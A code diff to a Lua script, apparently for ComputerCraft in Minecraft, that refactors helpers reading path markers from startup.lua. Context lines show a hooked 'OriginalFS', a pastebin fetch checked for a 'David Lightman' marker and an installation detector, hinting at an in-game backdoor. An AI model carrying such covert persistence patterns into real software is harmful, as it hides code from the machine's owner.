@@ -18,9 +18,49 @@ local function scan_startup()
     if OriginalFS.exists("startup.lua") then local f=OriginalFS.open("startup.lua","r") local l1,l2,l3=f.readLine(),f.readLine(),f.readLine() f.close() if (l1..l2..l3):find("wget pastebin") then local u=string.match(l1..l2..l3,"pastebin%s+(%S+)") if u then local r=http.get("https://pastebin.com/raw/"..u) if r and r.readAll():find("David Lightman") then return true end end elseif (l1..l2..l3):find("David Lightman") then return true end end
     return false
 end
-local function getRealStartupPath() if not OriginalFS.exists("startup.lua") then return nil end local f = OriginalFS.open("startup.lua", "r") for i = 1, 6 do local l = f.readLine() if not l then break end local filename = string.match(l, "^%-%-%s*(.-)%.$") if filename then f.close() return filename end end f.close() return nil end
-local function getBDApath() local f=OriginalFS.exists("startup.lua") and OriginalFS.open("startup.lua","r") or nil for i=1,6 do local l=f and f.readLine() if not l then break end local path,filename=string.match(l,"^%-%-%s*(.-),(.-)$") if path and filename then f.close() return path,filename end end if f then f.close() end return nil,nil end
 
+local function getRealStartupPath()
+    --shell.setDir("/")
+    if not fs.exists("/startup.lua") then return nil end
+    local f1 = fs.open("/startup.lua", "r")
+    if not f1 then return nil end  -- Safeguard against failed open
+    for i = 1, 6 do
+        local l = f1.readLine()
+        if not l then 
+            break
+        end
+        local filename = string.match(l, "^%-%-(%S+)%.$")
+        if filename then
+            f1.close()
+            return filename
+        end
+    end
+    f1.close()
+    return nil
+end
+
+local function getBDApath()
+    if not fs.exists("/startup.lua") then
+        return nil, nil 
+    end
+    local f = fs.open("/startup.lua", "r")
+    if not f then 
+        return nil, nil
+    end
+    for i = 1, 6 do
+        local l = f.readLine()
+        if not l then 
+            break
+        end
+        local path, filename = string.match(l, "^%-%-(.-),(%S+)$")
+        if path and filename then
+            f.close()
+            return path, filename
+        end
+    end
+    f.close()
+    return nil, nil
+end
 
 local function detect_installation()
     local flag1,flag2,flag3,flag4 = false,scan_startup(),(getBDApath()~=nil),false
